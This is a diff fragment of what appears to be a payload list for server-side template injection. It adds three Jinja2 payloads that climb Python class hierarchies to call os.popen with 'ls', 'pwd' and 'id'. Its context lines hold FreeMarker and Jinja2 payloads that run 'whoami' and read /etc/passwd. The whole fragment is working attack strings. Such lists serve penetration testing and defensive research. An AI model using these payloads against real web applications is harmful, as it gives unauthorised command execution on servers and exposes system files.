@@ -59,6 +59,9 @@ ${"freemarker.template.utility.Execute"?new()("whoami")}
 {{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("whoami").read() }}
 {{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
 {{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
+{{"foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}
+{{"foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("pwd").read()}}
+{{"foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("id").read()}}
 {{config.__class__.__init__.__globals__['os'].popen('pwd').read()}}
 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
